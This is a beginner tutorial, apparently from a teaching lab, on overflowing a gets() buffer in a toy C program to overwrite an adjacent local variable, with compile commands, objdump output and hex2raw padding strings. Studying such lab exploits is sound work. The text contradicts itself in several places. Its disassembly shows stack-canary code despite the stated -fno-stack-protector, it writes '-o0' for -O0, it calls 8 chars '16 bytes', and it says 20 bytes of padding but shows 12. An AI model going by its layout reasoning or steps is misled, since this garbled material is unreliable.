# Stack Overflow Level 1

> After the introductory level, you can start your first real hacking now. We will introduce you how to sneakily modify a variable's value which is in the same function with buffer. Ready?

## Goals
1. Use tools to figure out the target program's structure
2. Figure out a proper length of string and use `hex2raw` to compose a input string
3. Modify the neighboring value 

## Be familiar with tools
Here is the code of `example.c`:

    // example.c
    #include <stdio.h>
    #define BUF_SIZE 8

    int readBuf(){
      int a = 0;
      char buf[BUF_SIZE];
      gets(buf);
      return a;
    }

    void test(){
      int ret = readBuf();
      if(ret == 0)
        printf("Value is normal :(\n");
      else
        printf("You modified the value into: %d\n", ret);
    }

    int main(){
      test();
      return 0;
    }


We use `gcc` to compile the program `example.c`. In order to simplify the exploiting process, we will use the least optimization, i.e. `-o0`. And, to prevent the stack smashing protection by `gcc`, we will add a option `fno-stack-protector` as well.

So, `gcc example.c -o0 -fno-stack-protector -o example`. And we got it.

Next, we will learn about `objdump`. Do `objdump -d example | less` to see the disassembled result. Find the "important" functions: `main`, `test` and `readBuf`, esp. `readBuf`:

    000000000040062d <readBuf>:
      40062d:       55                      push   %rbp
      40062e:       48 89 e5                mov    %rsp,%rbp
      400631:       48 83 ec 30             sub    $0x30,%rsp
      400635:       64 48 8b 04 25 28 00    mov    %fs:0x28,%rax
      40063c:       00 00 
      40063e:       48 89 45 f8             mov    %rax,-0x8(%rbp)
      400642:       31 c0                   xor    %eax,%eax
      400644:       c7 45 dc 00 00 00 00    movl   $0x0,-0x24(%rbp)
      40064b:       48 8d 45 e0             lea    -0x20(%rbp),%rax
      40064f:       48 89 c7                mov    %rax,%rdi
      400652:       e8 d9 fe ff ff          callq  400530 <gets@plt>
      400657:       8b 45 dc                mov    -0x24(%rbp),%eax
      40065a:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
      40065e:       64 48 33 14 25 28 00    xor    %fs:0x28,%rdx
      400665:       00 00 
      400667:       74 05                   je     40066e <readBuf+0x41>
      400669:       e8 82 fe ff ff          callq  4004f0 <__stack_chk_fail@plt>
      40066e:       c9                      leaveq 
      40066f:       c3                      retq   


So, apparently, the local variables in `readBuf` occupy `0x20` or 32 bytes. This is due to a `int` which is 4 bytes long, and 8 `char` which is 16 bytes longs. So, we needs at least 20 bytes. But on my 64-bit machine, it do a 16-bytes align. So, we needs align it to 32 bytes, i.e. `0x20`

## Compose the string
Based on the previous knowledge, the string will first have a 20-byte long paddings, then fellowing a `int`. And the endian problem plays here. Whatever, We just need to do some experiment to find the truth. For example, we add `00 00 00 01` and get `string`:

    FF FF FF FF 
    FF FF FF FF
    FF FF FF FF
    00 01 00 00

Then, we use `hex2raw` to convert the heximal string into a ascii string file `hex_str`, which could be read by `gets` correctly: `./hex2raw < string > hex_str`

Then, we run the program: `./example < hex_str`

The output is not 1, but 256, which is `0x00000100` in fact.

So, we can do a reverse, using `string` as:

    FF FF FF FF
    FF FF FF FF
    FF FF FF FF
    01 00 00 00

Then we will get output: 1

Do you have some conclusion?

In fact, this is a little surprise. There seems to be some space between the 16 bytes long `char[]` and 4 bytes long `int`. So, practice speaks.